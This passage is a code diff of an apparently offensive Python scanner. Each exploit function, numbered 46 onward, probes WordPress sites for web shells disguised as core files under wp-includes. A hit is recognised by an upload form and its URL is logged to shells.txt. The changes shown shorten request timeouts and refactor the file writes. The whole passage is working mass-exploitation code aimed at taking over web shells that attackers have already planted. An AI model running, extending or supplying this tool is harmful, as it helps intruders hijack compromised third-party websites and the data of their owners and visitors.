         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'//wp-includes/customize/class-wp-customize-header-image-control-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'//wp-includes/customize/class-wp-customize-header-image-control-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 46 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-header-image-control-stream.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/customize/class-wp-customize-header-image-control-stream.php')
             else:
                 print ('[#] Exploit 46 z--> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1055,17 +1055,17 @@ def exploit_47(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-private.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-private.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 47 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-private.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/customize/class-wp-customize-filter-setting-private.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 47 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-private.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/customize/class-wp-customize-filter-setting-private.php')
             else:
                 print ('[#] Exploit 47 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1077,17 +1077,17 @@ def exploit_48(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/class-simplepie-ajax.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/class-simplepie-ajax.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 48 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/class-simplepie-ajax.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/class-simplepie-ajax.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/class-simplepie-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/class-simplepie-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 48 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/class-simplepie-ajax.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/class-simplepie-ajax.php')
             else:
                 print ('[#] Exploit 48 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1099,17 +1099,17 @@ def exploit_49(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/class-wp-term-query-cron.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/class-wp-term-query-cron.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 49 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-term-query-cron.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/class-wp-term-query-cron.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/class-wp-term-query-cron.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/class-wp-term-query-cron.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 49 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-term-query-cron.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/class-wp-term-query-cron.php')
             else:
                 print ('[#] Exploit 49 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1121,17 +1121,17 @@ def exploit_50(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/feed-rdf-stream.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/feed-rdf-stream.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 50 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/feed-rdf-stream.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/feed-rdf-stream.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/feed-rdf-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/feed-rdf-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 50 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/feed-rdf-stream.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/feed-rdf-stream.php')
             else:
                 print ('[#] Exploit 50 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1143,17 +1143,17 @@ def exploit_51(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/class-wp-simplepie-sanitize-kses-stream.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/class-wp-simplepie-sanitize-kses-stream.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 51 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-simplepie-sanitize-kses-stream.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/class-wp-simplepie-sanitize-kses-stream.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/class-wp-simplepie-sanitize-kses-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/class-wp-simplepie-sanitize-kses-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 51 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-simplepie-sanitize-kses-stream.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/class-wp-simplepie-sanitize-kses-stream.php')
             else:
                 print ('[#] Exploit 51 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1165,17 +1165,17 @@ def exploit_52(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/class-wp-tax-query-private.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/class-wp-tax-query-private.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 52 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-tax-query-private.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/class-wp-tax-query-private.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/class-wp-tax-query-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/class-wp-tax-query-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 52 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-tax-query-private.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/class-wp-tax-query-private.php')
             else:
                 print ('[#] Exploit 52 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1187,17 +1187,17 @@ def exploit_53(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/class-wp-customize-widgets-ajax.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/class-wp-customize-widgets-ajax.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 53 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-customize-widgets-ajax.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/class-wp-customize-widgets-ajax.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/class-wp-customize-widgets-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/class-wp-customize-widgets-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 53 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-customize-widgets-ajax.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/class-wp-customize-widgets-ajax.php')
             else:
                 print ('[#] Exploit 53 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1209,17 +1209,17 @@ def exploit_54(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/atomlib-private.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/atomlib-private.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 54 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/atomlib-private.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/atomlib-private.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/atomlib-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/atomlib-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 54 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/atomlib-private.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/atomlib-private.php')
             else:
                 print ('[#] Exploit 54 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1231,17 +1231,17 @@ def exploit_55(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/customize/class-wp-customize-background-position-control-ajax.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/customize/class-wp-customize-background-position-control-ajax.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 55 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-background-position-control-ajax.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/customize/class-wp-customize-background-position-control-ajax.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/customize/class-wp-customize-background-position-control-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/customize/class-wp-customize-background-position-control-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 55 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-background-position-control-ajax.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/customize/class-wp-customize-background-position-control-ajax.php')
             else:
                 print ('[#] Exploit 55 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1253,17 +1253,17 @@ def exploit_56(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/sodium_compat/autoload-php7-meta.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/sodium_compat/autoload-php7-meta.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 56 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/sodium_compat/autoload-php7-meta.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/sodium_compat/autoload-php7-meta.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/sodium_compat/autoload-php7-meta.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/sodium_compat/autoload-php7-meta.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 56 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/sodium_compat/autoload-php7-meta.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/sodium_compat/autoload-php7-meta.php')
             else:
                 print ('[#] Exploit 56 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1275,17 +1275,17 @@ def exploit_57(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/class-wp-user-request-cron.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/class-wp-user-request-cron.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 57 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-user-request-cron.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/class-wp-user-request-cron.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/class-wp-user-request-cron.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/class-wp-user-request-cron.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 57 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-user-request-cron.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/class-wp-user-request-cron.php')
             else:
                 print ('[#] Exploit 57 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1297,17 +1297,17 @@ def exploit_58(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/feed-private.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/feed-private.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 58 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/feed-private.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/feed-private.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/feed-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/feed-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 58 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/feed-private.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/feed-private.php')
             else:
                 print ('[#] Exploit 58 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1319,17 +1319,17 @@ def exploit_59(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/class-wp-recovery-mode-email-service-private.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/class-wp-recovery-mode-email-service-private.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 59 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-recovery-mode-email-service-private.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/class-wp-recovery-mode-email-service-private.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/class-wp-recovery-mode-email-service-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/class-wp-recovery-mode-email-service-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 59 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-recovery-mode-email-service-private.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/class-wp-recovery-mode-email-service-private.php')
             else:
                 print ('[#] Exploit 59 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1341,17 +1341,17 @@ def exploit_60(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/class-wp-locale-switcher-ajax.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/class-wp-locale-switcher-ajax.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 60 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-locale-switcher-ajax.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/class-wp-locale-switcher-ajax.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/class-wp-locale-switcher-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/class-wp-locale-switcher-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 60 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-locale-switcher-ajax.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/class-wp-locale-switcher-ajax.php')
             else:
                 print ('[#] Exploit 60 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1363,17 +1363,17 @@ def exploit_61(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/block-template-utils-core.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/block-template-utils-core.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 61 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/block-template-utils-core.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/block-template-utils-core.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/block-template-utils-core.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/block-template-utils-core.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 61 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/block-template-utils-core.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/block-template-utils-core.php')
             else:
                 print ('[#] Exploit 61 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1385,17 +1385,17 @@ def exploit_62(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/class-wp-customize-control-ajax.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/class-wp-customize-control-ajax.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 62 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-customize-control-ajax.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/class-wp-customize-control-ajax.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/class-wp-customize-control-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/class-wp-customize-control-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 62 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-customize-control-ajax.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/class-wp-customize-control-ajax.php')
             else:
                 print ('[#] Exploit 62 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1407,17 +1407,17 @@ def exploit_63(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/class-wp-session-tokens-core.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/class-wp-session-tokens-core.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 63 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-session-tokens-core.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/class-wp-session-tokens-core.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/class-wp-session-tokens-core.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/class-wp-session-tokens-core.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 63 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-session-tokens-core.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/class-wp-session-tokens-core.php')
             else:
                 print ('[#] Exploit 63 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1429,17 +1429,17 @@ def exploit_64(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/customize/class-wp-widget-area-customize-control-stream.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/customize/class-wp-widget-area-customize-control-stream.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 64 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-widget-area-customize-control-stream.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/customize/class-wp-widget-area-customize-control-stream.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/customize/class-wp-widget-area-customize-control-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/customize/class-wp-widget-area-customize-control-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 64 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-widget-area-customize-control-stream.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/customize/class-wp-widget-area-customize-control-stream.php')
             else:
                 print ('[#] Exploit 64 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1451,17 +1451,17 @@ def exploit_65(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/class-walker-category-dropdown-ajax-response.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/class-walker-category-dropdown-ajax-response.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 65 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/class-walker-category-dropdown-ajax-response.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/class-walker-category-dropdown-ajax-response.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/class-walker-category-dropdown-ajax-response.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/class-walker-category-dropdown-ajax-response.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 65 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/class-walker-category-dropdown-ajax-response.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/class-walker-category-dropdown-ajax-response.php')
             else:
                 print ('[#] Exploit 65 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1473,17 +1473,17 @@ def exploit_66(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/class-wp-customize-control-ajax-response.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/class-wp-customize-control-ajax-response.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 66 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-customize-control-ajax-response.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/class-wp-customize-control-ajax-response.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/class-wp-customize-control-ajax-response.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/class-wp-customize-control-ajax-response.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 66 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-customize-control-ajax-response.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/class-wp-customize-control-ajax-response.php')
             else:
                 print ('[#] Exploit 66 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1495,17 +1495,17 @@ def exploit_67(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/class-wp-customize-control-wp.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/class-wp-customize-control-wp.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 67 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-customize-control-wp.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/class-wp-customize-control-wp.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/class-wp-customize-control-wp.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/class-wp-customize-control-wp.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 67 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-customize-control-wp.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/class-wp-customize-control-wp.php')
             else:
                 print ('[#] Exploit 67 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1517,17 +1517,17 @@ def exploit_68(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
